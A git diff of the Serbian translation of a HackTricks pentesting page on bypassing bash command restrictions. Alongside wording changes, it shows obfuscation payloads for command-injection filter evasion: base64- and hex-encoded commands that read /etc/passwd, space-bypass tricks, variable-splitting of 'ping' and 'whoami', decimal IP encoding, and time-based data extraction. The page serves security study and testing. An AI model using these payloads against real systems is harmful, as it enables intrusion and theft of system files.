@@ -6,7 +6,7 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodičnu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -17,12 +17,12 @@ Drugi načini podrške HackTricks-u:
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Koristite [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Dobijte pristup danas:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Zaobilazak uobičajenih ograničenja
+## Zaobilazak Čestih Ograničenja
 
 ### Reverse Shell
 ```bash
@@ -75,13 +75,18 @@ $(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
 $(rev<<<'imaohw') #whoami
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
 
-
 # Execution through $0
 echo whoami|$0
 
 # Uninitialized variables: A uninitialized variable equals to null (nothing)
 cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
 p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
+
+# New lines
+p\
+i\
+n\
+g # These 4 lines will equal to ping
 
 # Fake commands
 p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
@@ -93,7 +98,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Zaobiđite zabranjene razmake
+### Zaobiđite zabranjene prostore
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -115,12 +120,6 @@ X=$'cat\x20/etc/passwd'&&$X
 
 # Using tabs
 echo "ls\x09-l" | bash
-
-# New lines
-p\
-i\
-n\
-g # These 4 lines will equal to ping
 
 # Undefined variables and !
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
@@ -145,12 +144,12 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Zaobilazak IP adresa
+### Zaobilaženje IP adresa
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Izvlačenje podataka zasnovano na vremenu
+### Iznošenje podataka zasnovano na vremenu
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -166,7 +165,7 @@ Možete koristiti **burpcollab** ili [**pingb**](http://pingb.in) na primer.
 ### Ugrađeni
 
 U slučaju da ne možete izvršiti spoljne funkcije i imate pristup samo **ograničenom skupu ugrađenih funkcija za dobijanje RCE**, postoje neki korisni trikovi za to. Obično **nećete moći koristiti sve** ugrađene funkcije, pa biste trebali **znati sve svoje opcije** kako biste pokušali da zaobiđete zatvor. Ideja od [**devploit**](https://twitter.com/devploit).\
-Prvo proverite sve [**shell ugrađene funkcije**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Onda ovde imate neke **preporuke**:
+Prvo proverite sve [**shell ugrađene funkcije**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Onda imate neke **preporuke**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -315,15 +314,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Bypassovanje zaštite samo za čitanje/Noexec/Distroless
+## Bypassovanje zaštite samo za čitanje/izvršavanje/Distroless
 
-Ako se nalazite unutar sistema datoteka sa **zaštitom samo za čitanje i noexec** ili čak u distroless kontejneru, i dalje postoje načini da **izvršite proizvoljne binarne datoteke, čak i shell!:**
+Ako se nalazite unutar sistema datoteka sa **zaštitom samo za čitanje i izvršavanje** ili čak u Distroless kontejneru, i dalje postoje načini da **izvršite proizvoljne binarne datoteke, čak i shell!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Bypass Chroot-a i drugih zatvora
+## Bypassovanje Chroot-a i drugih zatvora
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -339,8 +338,8 @@ Ako se nalazite unutar sistema datoteka sa **zaštitom samo za čitanje i noexec
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
-Dobijte pristup danas:
+Koristite [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Pristupite danas:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
@@ -350,10 +349,10 @@ Dobijte pristup danas:
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
